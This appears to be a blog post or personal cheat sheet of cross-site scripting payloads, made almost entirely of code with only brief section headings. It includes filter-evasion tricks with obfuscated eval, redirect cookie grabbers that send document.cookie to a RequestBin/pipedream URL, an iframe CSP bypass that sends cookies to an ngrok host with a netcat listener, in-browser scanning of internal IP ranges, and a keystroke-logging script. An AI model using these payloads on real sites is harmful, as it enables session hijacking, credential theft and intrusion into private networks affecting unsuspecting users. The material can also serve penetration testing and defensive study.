---
layout: post
title: "xss"
keywords: "xss, iframe, cookie"
---
#### Identification
Check the context (inspect element)
```
<u>xss</u>
<script>alert(1)</script>
xss"><script>alert(1)</script>
</title><script>alert(1)</script>
xss%27;+alert(1);//xss
```

#### Filter Evasion
```
<img src=x onerror="alert('xss')" />
<img src=x onerror=confirm('xss')" />
<object onerror=alert('xss')>
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))";>
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('xss')"></xss>
```

#### Redirect Cookie Grabber
[Create new public RequestBin](https://requestbin.com/r)
```
<script>window.location='https://en52dhl6gyckw.x.pipedream.net/?cookie='+document.cookie</script>
<script>document.location='https://en52dhl6gyckw.x.pipedream.net/?cookie='+document.cookie</script>
```

#### Grab Machine IP Address (Reflected)
```
https://target/?payload=%3Cscript%3Ealert(window.location.hostname)%3C/script%3E
```

#### DOM-Based XXS
```
pwn" onmouseover="alert('xss')
```

#### IP and Port Scanning with XSS
```
<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">

<script>
    for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
        let ip = '192.168.0.' + i // Creates variable for forming IP
        // Creating an image element, if the resource can load, it logs to the /logs page.
        let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
        document.body.innerHTML += code // This is adding the image element to the webpage
    }
</script> 
```

#### Bypass CSP and steal cookie using iframe

```
# Listener
nc -klnvp 9000
ngrok http 9000

# XSS
<iframe src="http://localhost:1337/list?callback=window.parent.location.href%3D`http://4ea69d0ff8e3.ngrok.io?c=%24%7Bdocument.cookie%7D`;display"></iframe>
```

#### Keylogger
```
<script type="text/javascript">
    let l = ""; // Variable to store key-strokes in
    document.onkeypress = function (e) { // Event to listen for key presses
        l += e.key; // If user types, log it to the l variable
        console.log(l); // update this line to post to your own server
    }
</script> 
```